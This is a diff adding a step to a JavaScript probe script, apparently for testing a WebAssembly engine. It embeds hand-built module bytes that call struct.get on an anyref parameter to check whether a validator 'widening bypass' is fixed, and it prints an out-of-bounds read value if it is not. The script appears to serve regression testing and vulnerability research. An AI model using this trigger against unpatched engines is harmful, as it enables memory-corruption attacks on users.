@@ -64,3 +64,32 @@ try {
     }
     print("STEP2_DONE");
 } catch(e) { print("STEP2_COMPILE_ERROR: " + e); }
+
+// STEP3: 9dcbd254af related — struct.get on anyref (widening bypass)
+// Per spec: struct.get on anyref param = INVALID → CompileError
+// Before widening fix: accepted because body sees concrete type
+print("");
+print("=== STEP 3: widening bypass — struct.get on anyref ===");
+const bytes_widening = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+    0x01, 0x0e, 0x03, 0x5f, 0x01, 0x7e, 0x01, 0x60,
+    0x01, 0x6e, 0x01, 0x7e, 0x60, 0x00, 0x01, 0x7e,
+    0x03, 0x02, 0x01, 0x01, 0x07, 0x08, 0x01, 0x04,
+    0x74, 0x65, 0x73, 0x74, 0x00, 0x00, 0x0a, 0x0a,
+    0x01, 0x08, 0x00, 0x20, 0x00, 0xfb, 0x02, 0x00,
+    0x00, 0x0b,
+]);
+try {
+    const mod3 = new WebAssembly.Module(bytes_widening);
+    print("STEP3_MODULE: compiled (spec violation — struct.get on anyref accepted!)");
+    const inst3 = new WebAssembly.Instance(mod3);
+    print("STEP3_INSTANCE: ok");
+    try {
+        const r3 = inst3.exports.test(null);
+        print("STEP3_RESULT: " + r3 + " (struct.get on null → OOB read value)");
+    } catch(inner3) {
+        print("STEP3_RUNTIME: " + inner3);
+    }
+} catch(e) {
+    print("STEP3_FIXED: " + e);
+}
